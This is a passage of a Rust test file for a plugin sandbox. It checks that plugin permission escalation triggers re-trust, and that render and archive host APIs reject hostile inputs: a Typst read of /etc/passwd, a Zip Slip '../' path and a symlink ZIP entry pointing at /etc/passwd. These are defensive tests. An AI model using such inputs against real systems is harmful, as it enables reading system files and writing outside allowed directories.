    std::fs::create_dir_all(&plugin_src).unwrap();
    std::fs::write(plugin_src.join("index.js"), "module.exports = {};\n").unwrap();
    std::fs::write(
        plugin_src.join("manifest.toml"),
        r#"
id = "esc-plugin"
name = "Esc"
version = "0.1.0"
capabilities = ["tool"]
[permissions]
workspace_read = true
"#,
    )
    .unwrap();
    let pm = PluginManager::new(&data_dir);
    let inst = pm.install_from_dir(&plugin_src).unwrap();
    assert!(inst.pending_trust);
    pm.trust_plugin("esc-plugin").unwrap();
    let trusted = pm.list_plugins().unwrap();
    assert!(
        !trusted
            .iter()
            .find(|p| p.manifest.id == "esc-plugin")
            .unwrap()
            .pending_trust
    );
    // Escalate manifest with workspace_write = true -> must re-trigger pending_trust.
    std::fs::write(
        data_dir.join("plugins/esc-plugin/manifest.toml"),
        r#"
id = "esc-plugin"
name = "Esc"
version = "0.2.0"
capabilities = ["tool"]
[permissions]
workspace_read = true
workspace_write = true
"#,
    )
    .unwrap();
    let after_esc = pm.list_plugins().unwrap();
    assert!(
        after_esc
            .iter()
            .find(|p| p.manifest.id == "esc-plugin")
            .unwrap()
            .pending_trust
    );
}

#[test]
fn phase7c_render_typst_math_archive_and_crypto_host_apis() {
    let host_ctx = HostContext {
        manifest: minimal_manifest("cap-v2", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };

    let src = r#"
        module.exports = {
            runAll() {
                const svgOut = host.render.renderTypst("= Hello\n$a^2 + b^2 = c^2$", {
                    format: "svg",
                    widthPt: 220,
                    theme: "light",
                });
                const pngOut = host.render.renderTypst("Dark *text*", {
                    format: "png",
                    scale: 1.5,
                    theme: "dark",
                });
                const mathSvg = host.render.renderMath("\\sum_{i=1}^n i = \\frac{n(n+1)}{2}", {
                    display: true,
                    format: "svg",
                });
                const mathPng = host.render.renderMath("\\alpha + \\beta", {
                    display: false,
                    format: "png",
                    scale: 2.0,
                });

                const zipB64 = host.archive.createZip([
                    { path: "a/hello.txt", text: "hello world" },
                    { path: "bin/data.bin", base64: "AAECAw==" },
                ]);
                const listed = host.archive.listZip(zipB64);
                const readAll = host.archive.readZip(zipB64);
                const readFiltered = host.archive.readZip(zipB64, { paths: ["a/hello.txt"], asText: true });

                const hashUtf8 = host.crypto.sha256("abc");
                const hashB64 = host.crypto.sha256("YWJj", "base64");

                return {
                    svgOut,
                    pngOut,
                    mathSvg,
                    mathPng,
                    listed,
                    readAll,
                    readFiltered,
                    hashUtf8,
                    hashB64,
                };
            },
            tryDiskRead() {
                return host.render.renderTypst('#read("/etc/passwd")');
            },
            tryZipSlip() {
                return host.archive.createZip([{ path: "../escape.txt", text: "nope" }]);
            }
        };
    "#;

    let res = PluginRuntime::call_function(src, "runAll", &[], &host_ctx).unwrap();
    assert!(
        res.value["svgOut"]["svg"]
            .as_str()
            .unwrap()
            .contains("<svg")
    );
    assert!(res.value["svgOut"]["width"].as_f64().unwrap() > 0.0);
    assert!(
        !res.value["pngOut"]["pngBase64"]
            .as_str()
            .unwrap()
            .is_empty()
    );
    assert!(
        res.value["mathSvg"]["svg"]
            .as_str()
            .unwrap()
            .contains("<svg")
    );
    assert!(
        !res.value["mathPng"]["pngBase64"]
            .as_str()
            .unwrap()
            .is_empty()
    );

    assert_eq!(res.value["listed"].as_array().unwrap().len(), 2);
    assert_eq!(res.value["readAll"].as_array().unwrap().len(), 2);
    assert_eq!(res.value["readFiltered"].as_array().unwrap().len(), 1);
    assert_eq!(res.value["readFiltered"][0]["text"], "hello world");

    const SHA256_ABC: &str = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
    assert_eq!(res.value["hashUtf8"], SHA256_ABC);
    assert_eq!(res.value["hashB64"], SHA256_ABC);

    // Pure-memory fragment renderer must block host disk reads.
    let disk_err = PluginRuntime::call_function(src, "tryDiskRead", &[], &host_ctx).unwrap_err();
    assert_eq!(disk_err.code(), "RENDER_ERROR");

    // createZip must reject Zip Slip path traversal.
    let slip_err = PluginRuntime::call_function(src, "tryZipSlip", &[], &host_ctx).unwrap_err();
    assert_eq!(slip_err.code(), "ZIP_SLIP");

    // Direct Rust archive tests: reject symlink entries and oversized ZIP bombs.
    use base64::Engine as _;
    let mut cursor = std::io::Cursor::new(Vec::<u8>::new());
    {
        let mut w = zip::ZipWriter::new(&mut cursor);
        w.add_symlink(
            "link",
            "/etc/passwd",
            zip::write::SimpleFileOptions::default(),
        )
        .unwrap();
        w.finish().unwrap();
    }
    let symlink_zip = base64::engine::general_purpose::STANDARD.encode(cursor.into_inner());
    let sym_err = crate::read_zip(&symlink_zip, None, true).unwrap_err();
    assert_eq!(sym_err.code(), "ZIP_SLIP");
}
